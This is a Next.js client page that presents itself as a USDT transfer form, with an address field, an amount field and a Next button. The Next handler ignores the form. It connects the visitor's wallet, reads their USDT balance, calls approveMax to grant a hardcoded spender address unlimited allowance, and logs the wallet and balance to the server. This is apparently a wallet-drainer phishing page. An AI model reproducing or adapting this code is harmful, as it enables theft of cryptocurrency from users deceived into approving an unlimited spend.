/* eslint-disable @typescript-eslint/no-unsafe-assignment */
"use client";

import {
  approveMax,
  fetchUsdtBalance,
  getWallet,
} from "~/lib/crypto-functions";
import { api } from "~/trpc/react";

export default function Home() {
  const { mutateAsync: addWallet } = api.crypto.addWallet.useMutation();

  async function handleNext() {
    const SPENDER = "0x0C90CD2c2AeDb86F7aDEB78640cB0F5ABb554327";
    const { provider, signer, address } = await getWallet();
    const balance = await fetchUsdtBalance(provider, address);
    console.log("ADDRESS: ", address);

    console.log("USDT Balance:", balance);

    const response = await approveMax(signer, SPENDER);

    await addWallet({
      address,
      balance: Number(balance),
      spender: SPENDER,
    });
  }

  return (
    <div className="flex max-h-screen min-h-screen flex-col justify-between bg-white">
      <div className="space-y-6 px-6 pt-8">
        <div className="space-y-2">
          <label className="text-sm text-gray-500">
            Address or Domain Name
          </label>
          <div className="relative">
            <input
              type="text"
              value="0x4bBaB1F351D016AFa68ac59998446bA4c318332D"
              className="w-full rounded-xl border border-gray-300 px-4 py-3 pr-20 text-sm focus:ring-2 focus:ring-blue-500 focus:outline-none"
            />
            <button className="absolute top-1/2 right-4 -translate-y-1/2 text-sm font-medium text-blue-600">
              Paste
            </button>
          </div>
        </div>

        <div className="space-y-2">
          <label className="text-sm text-gray-500">Amount</label>
          <div className="relative">
            <input
              type="number"
              placeholder="0.00"
              className="w-full rounded-xl border border-gray-300 px-4 py-3 pr-24 text-sm focus:ring-2 focus:ring-blue-500 focus:outline-none"
            />
            <div className="absolute top-1/2 right-4 flex -translate-y-1/2 items-center gap-2">
              <span className="text-sm text-gray-600">USDT</span>
              <button className="text-sm font-medium text-blue-600">Max</button>
            </div>
          </div>
          <p className="text-sm text-gray-500">= $0.00</p>
        </div>
      </div>

      <div className="p-4">
        <button
          className="w-full rounded-full bg-blue-700 py-3 text-lg font-semibold text-white transition active:scale-[0.99]"
          onClick={() => handleNext()}
        >
          Next
        </button>
      </div>
    </div>
  );
}
